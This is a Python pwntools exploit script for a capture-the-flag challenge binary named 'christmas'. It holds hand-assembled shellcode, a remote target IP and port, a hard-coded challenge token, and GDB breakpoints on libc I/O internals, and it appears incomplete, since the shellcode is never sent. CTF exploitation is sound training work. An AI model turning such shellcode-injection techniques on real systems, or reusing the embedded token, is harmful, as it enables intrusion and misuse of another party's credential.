#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time
import os

IP = "150.109.44.250"
PORT = 20002

one_gg = 0xf02a4

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
BIN = "./christmas"

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
    rud("Input your token:")
    sel("7024ZEBXOyaCi7hWLskq2GKI1NUczUay")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif args.local or args.debugger:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

v1 = [0x3148F08948FC8948,
      0x48D23148C93148DB,
      0xC0314DF63148FF31,
      0x314DD2314DC9314D,
      0x4DED314DE4314DDB,
      0xED3148FF314DF631]

print disasm("".join(p64(i) for i in v1))

'''
   0:   48 89 fc                mov    rsp,rdi
   3:   48 89 f0                mov    rax,rsi
   6:   48 31 db                xor    rbx,rbx
   9:   48 31 c9                xor    rcx,rcx
   c:   48 31 d2                xor    rdx,rdx
   f:   48 31 ff                xor    rdi,rdi
  12:   48 31 f6                xor    rsi,rsi
  15:   4d 31 c0                xor    r8,r8
  18:   4d 31 c9                xor    r9,r9
  1b:   4d 31 d2                xor    r10,r10
  1e:   4d 31 db                xor    r11,r11
  21:   4d 31 e4                xor    r12,r12
  24:   4d 31 ed                xor    r13,r13
  27:   4d 31 f6                xor    r14,r14
  2a:   4d 31 ff                xor    r15,r15
  2d:   48 31 ed                xor    rbp,rbp
'''

shell = asm('''
    mov rbx, 0x400a10
    call rbx
    mov rbx, 0x602060
    mov rbx, qword ptr [rbx]
    sub rax, rbx
    mov rcx, rax
    push rcx
    mov rsi, rsp
    mov rax, 1
    mov rdx, 8
    push 1
    pop rdi
    syscall
''')
rud("Santa Claus hides the SECRCT FLAG in libflag.so , can you tell me how to find it??")

if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    c
    b *exit
    b *_IO_new_file_finish
    b *_IO_new_file_overflow
    b *__GI__IO_file_close
    b *_IO_flush_all_lockp
    p/x &__free_hook
    p/x &_IO_2_1_stdout_
    '''.format(
        0x0000000000400D25,  # read1
        # 0x00007ffff7a0d000 + one_gg,
        one_gg,
    )
    )
sel("A"*8)
io.interactive()
